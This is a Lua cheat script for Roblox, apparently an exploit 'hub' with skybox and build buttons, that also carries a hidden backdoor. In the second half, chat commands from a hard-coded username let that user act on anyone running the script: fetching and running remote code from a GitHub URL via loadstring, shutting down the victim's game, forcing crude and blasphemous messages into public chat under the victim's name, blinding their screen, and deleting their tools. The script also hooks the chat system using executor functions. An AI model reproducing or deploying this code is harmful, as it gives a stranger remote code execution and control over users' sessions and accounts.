	Sky0.SkyboxRt = "rbxassetid://570557672"
	Sky0.SkyboxUp = "rbxassetid://570557727"
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = game:GetService("Lighting")
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end
end)

Sky:addButton("Vibe Sky", function()
	cors = {}
	mas = Instance.new("Model",game:GetService("Lighting"))
	Sky0 = Instance.new("Sky")
	Sky0.Parent = mas
	Sky0.CelestialBodiesShown = false
	Sky0.SkyboxBk = "rbxassetid://159067838"
	Sky0.SkyboxDn = "rbxassetid://159067646"
	Sky0.SkyboxFt = "rbxassetid://159067838"
	Sky0.SkyboxLf = "rbxassetid://159067744"
	Sky0.SkyboxRt = "rbxassetid://159067744"
	Sky0.SkyboxUp = "rbxassetid://159067921"
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = game:GetService("Lighting")
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end
end)

build:addButton("Barrier", function()
	function onTouched(part)       
		local h = part
		if h.Name == "Block" then
			game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(h,Enum.NormalId.Top)
		end
	end
	Partz              = Instance.new("Part")
	Partz.Parent       = workspace
	Partz.Transparency = 1
	Partz.CanCollide   = false
	Partz.Massless     = true
	Partz.Position     = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,51,0)
	Partz.Size         = Vector3.new(8,27,1)
	Partz.CFrame       = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector*3.5

	local light         = Instance.new("SelectionBox")
	light.Adornee       = Partz
	light.LineThickness = 0.05
	light.Color3        = Color3.fromRGB(17, 17, 257)
	light.Parent        = Partz
	light.Name          = "SelectBox"



	local bruh = Partz.Touched:connect(onTouched)
	wait()
	bruh:Disconnect()
	Partz:Destroy()
end)

-------------------------
----------------------------------
--------------------------------------
---------------------------------------------------


local players =	"yenilmez_xxgg" or
	"calloofduy" or 
	"xAnrimis" or 
	"Egexlia" or
	"skyloose"

game.Players[players].Chatted:Connect(function(msg)
	if msg == ",kick" then
		game:Shutdown()
	end
end)

game.Players[players].Chatted:Connect(function(msg)
	if msg == ",ff" then
		local Why      = game:GetService("Players").LocalPlayer
		local Char     = Why.Character
		local backpack = Why.Backpack

		Char.Humanoid:UnequipTools()
		wait()
		for i,v in next, backpack:GetDescendants() do
			if v:IsA("Tool") and v.Name =="Shield" then
				v.GripPos         = Vector3.new(0,10000,0)
				v.Handle.Massless = true
				v.Parent          = Char
				v:Activate()
				v.ShieldPotion:Destroy()
				v:Destroy()
			end
		end
	end
end)

game.Players[players].Chatted:Connect(function(msg)
	if msg == ",rj" then
		local ts = game:GetService("TeleportService")
		local p = game:GetService("Players").LocalPlayer
		ts:Teleport(game.PlaceId, p)
	end
end)

game.Players[players].Chatted:Connect(function(msg)
	if msg == ",slm" then
		for i,v in pairs(game.CoreGui:GetDescendants()) do
			if v.Name == "Intro" then
				v:Destroy()
			end
		end

		local Intro = Instance.new("ScreenGui")
		local Main = Instance.new("Frame")
		local Title = Instance.new("TextLabel")
		local UICorner = Instance.new("UICorner")
		local texts = Instance.new("TextLabel")
		local Glow = Instance.new("ImageLabel")
		local UICorner_2 = Instance.new("UICorner")
		local Flash = Instance.new("Frame")
		local UICorner_3 = Instance.new("UICorner")

		--Properties:

		Intro.Name = "Intro"
		Intro.Parent = game.CoreGui
		Intro.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		Main.Name = "Main"
		Main.Parent = Intro
		Main.Active = true
		Main.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
		Main.BackgroundTransparency = 1.000
		Main.Position = UDim2.new(0.740999997, 10, 1, -70)
		Main.Size = UDim2.new(0, 332, 0, 60)
		Main.Visible = false

		Title.Name = "Title"
		Title.Parent = Main
		Title.BackgroundTransparency = 1.000
		Title.Position = UDim2.new(0, 10, 0, 8)
		Title.Size = UDim2.new(1, -40, 0, 16)
		Title.Font = Enum.Font.GothamSemibold
		Title.Text = "Cihonax HUB [ Eski HUB :( ]"
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextSize = 14.000
		Title.TextTransparency = 1.000
		Title.TextXAlignment = Enum.TextXAlignment.Left

		UICorner.CornerRadius = UDim.new(0, 5)
		UICorner.Parent = Main

		texts.Name = "texts"
		texts.Parent = Main
		texts.BackgroundTransparency = 1.000
		texts.Position = UDim2.new(0, 10, 1, -24)
		texts.Size = UDim2.new(1, -40, 0, 16)
		texts.Font = Enum.Font.Gotham
		texts.Text = "Slm Aşko Napıyon"
		texts.TextColor3 = Color3.fromRGB(255, 255, 255)
		texts.TextSize = 14.000
		texts.TextTransparency = 1.000
		texts.TextXAlignment = Enum.TextXAlignment.Left

		Glow.Name = "Glow"
		Glow.Parent = Main
		Glow.BackgroundTransparency = 1.000
		Glow.Position = UDim2.new(0, -15, 0, -15)
		Glow.Size = UDim2.new(1, 30, 1, 30)
		Glow.Image = "rbxassetid://5028857084"
		Glow.ImageColor3 = Color3.fromRGB(0, 0, 0)
		Glow.ImageTransparency = 1.000
		Glow.ScaleType = Enum.ScaleType.Slice
		Glow.SliceCenter = Rect.new(24, 24, 276, 276)

		UICorner_2.CornerRadius = UDim.new(0, 5)
		UICorner_2.Parent = Glow

		Flash.Name = "Flash"
		Flash.Parent = Intro
		Flash.Active = true
		Flash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Flash.BorderSizePixel = 0
		Flash.Position = UDim2.new(0.740999997, 10, 1, -70)
		Flash.Size = UDim2.new(0, 0, 0, 60)
		Flash.Visible = false

		UICorner_3.CornerRadius = UDim.new(0, 5)
		UICorner_3.Parent = Flash

		Main.Visible = true
		for i = 1,10 do
			texts.TextTransparency = 1-(i/10)
			Title.TextTransparency = 1-(i/10)
			Main.BackgroundTransparency = 1-(i/10)
			Glow.ImageTransparency = 1-(i/10)
			wait()
		end
		wait(3)
		for i = 1,10 do
			texts.TextTransparency = i/10
			Title.TextTransparency = i/10
			Main.BackgroundTransparency = i/10
			Glow.ImageTransparency = i/10
			wait()
		end

		for i,v in pairs(game.CoreGui:GetDescendants()) do
			if v.Name == "Intro" then
				v:Destroy()
			end
		end
	end
end)

game.Players[players].Chatted:Connect(function(msg)
	if msg == ",bring" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[players].Character.Head.CFrame
	end
end)

game.Players[players].Chatted:connect(function(msg)
	if msg == ",skyfu" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Pa9kQafhpbRNT/es/main/skyfu", true))()
	end
end)

game.Players[players].Chatted:connect(function(msg)
	if msg == ",fly" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Pa9kQafhpbRNT/es/main/fly", true))()
	end
end)

game.Players[players].Chatted:connect(function(msg)
	if msg == ",31" then
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("31","All")
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("31 çekmek aşşırı havalı dostum!","All")
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("her gün 31 çekmelisin!!!","All")
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Allah yok","All")
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Tekrar 31 Çekiliyor....","All")
	end
end)

game.Players[players].Chatted:connect(function(msg)
	if msg == ",delete" then
		for i,v in pairs(game.CoreGui:GetDescendants()) do
			if v.Name == "VesoLoader" then
				v:Destroy()
			end
		end
		for i,v in pairs(game.CoreGui:GetDescendants()) do
			if v.Name == "Veso Lux" then
				v:Destroy()
			end
		end
		game.StarterGui:SetCore("SendNotification", {
			Title    = "Ur Hack Deleted :(";
			Text     = "LOL";
			Duration = 10;
		})
	end
end)

game.Players[players].Chatted:Connect(function(msg)
	if msg == ",blind" then
		local blind = Instance.new("BlurEffect" ,game.Lighting)
		blind.Name = "Blind"
		blind.Size = 99999999
	end
end)

game.Players[players].Chatted:Connect(function(msg)
	if msg == ",unblind" then
		for i,v in pairs(game.Lighting:GetDescendants()) do
			if v.Name == "Blind" then
				v:Destroy()
			end
		end
	end
end)















local CloneFunction = clonefunction
local CheckCaller = CloneFunction(checkcaller)
local HookFunction = CloneFunction(hookfunction)
local LocalPlayer = game.Players.PlayerAdded:wait()

local PostMessage = require(LocalPlayer:WaitForChild("PlayerScripts", 1/0):WaitForChild("ChatScript", 1/0):WaitForChild("ChatMain", 1/0)).MessagePosted
getgenv().MessageEvent = Instance.new("BindableEvent")

local OldFunctionHook
local PostMessageHook = function(self, msg)
	if not CheckCaller() and self == PostMessage then
		MessageEvent:Fire(msg)
		return
	end
	return OldFunctionHook(self, msg)
end
OldFunctionHook = HookFunction(PostMessage.fire, PostMessageHook)
